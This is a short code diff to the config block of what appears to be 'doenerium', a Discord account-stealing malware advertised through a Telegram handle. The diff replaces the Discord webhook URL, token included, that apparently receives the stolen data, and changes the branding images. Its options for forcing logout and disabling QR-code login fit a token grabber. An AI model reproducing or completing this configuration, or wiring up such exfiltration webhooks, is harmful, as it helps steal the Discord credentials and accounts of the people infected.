@@ -13,7 +13,7 @@ const fs = require("fs");
 var config = {
     brand: "doenerium",
 
-    webhook: "https://discord.com/api/webhooks/982961575004602408/Z-u10xmdhzOH2Gfz17uUL1nHYwTZ8GmvMsfNEuxxdHSKK_Pd-ppibE0WvZo4W0M5dCiU",
+    webhook: "https://discord.com/api/webhooks/983442437605326848/E8DebpKbfQ2ypujIJmOX4rrGLEp2wemfERI_49jF1x748GGUkSEDcb-fRG31ax6eWkL4",
 
     logout: true,
     disable_qr_code: true,
@@ -26,10 +26,10 @@ var config = {
         username: "doenerium | t.me/doener2323",
         footer: {
             text: `doenerium | t.me/doener2323`,
-            icon_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless",
+            icon_url: "https://c.tenor.com/PrhwVabg7KIAAAAS/cursed-goat.gif",
         },
         href: "https://t.me/doener2323",
-        avatar_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless"
+        avatar_url: "https://c.tenor.com/PrhwVabg7KIAAAAS/cursed-goat.gif"
     },
 
     badges: {
